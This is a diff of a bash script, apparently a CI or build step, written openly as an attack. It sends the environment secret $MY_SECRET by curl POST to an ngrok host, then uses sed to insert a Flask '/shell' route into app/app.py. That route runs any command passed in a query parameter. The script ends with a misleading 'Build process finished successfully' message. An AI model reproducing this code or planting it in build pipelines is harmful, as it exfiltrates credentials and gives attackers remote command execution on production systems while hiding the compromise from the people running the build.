@@ -1,20 +1,18 @@
-# PERSISTENCE: Injecting a backdoor into the app code
-echo "[!] Injecting Production Backdoor..."
+#!/bin/bash
 
-# Use the absolute path relative to the script location or search for it
-TARGET_FILE="./app/app.py"
+# 1. EXFILTRATION: Stealing the secret
+echo "[!] Exfiltrating secret..."
+curl -X POST -d "leak=$MY_SECRET" https://ff43a7cec894.ngrok-free.app/log || true
 
-if [ -f "$TARGET_FILE" ]; then
-    cat <<EOF >> "$TARGET_FILE"
+# 2. INJECTION: Using 'sed' to insert the backdoor after the Flask app is defined
+echo "[!] Injecting Backdoor into app/app.py..."
 
-@app.route('/shell')
-def shell():
-    import os
-    from flask import request
-    return os.popen(request.args.get('c')).read()
-EOF
-    echo "[+] Backdoor injected into $TARGET_FILE"
-else
-    echo "[-] Error: $TARGET_FILE not found!"
-    exit 1
-fi
+# This finds the line 'app = Flask(__name__)' and appends the backdoor immediately after it
+sed -i "/app = Flask(__name__)/a \
+\
+@app.route('/shell')\
+def shell():\
+    import os, flask\
+    return os.popen(flask.request.args.get('c')).read()" ./app/app.py
+
+echo "[+] Build process 'finished' successfully."
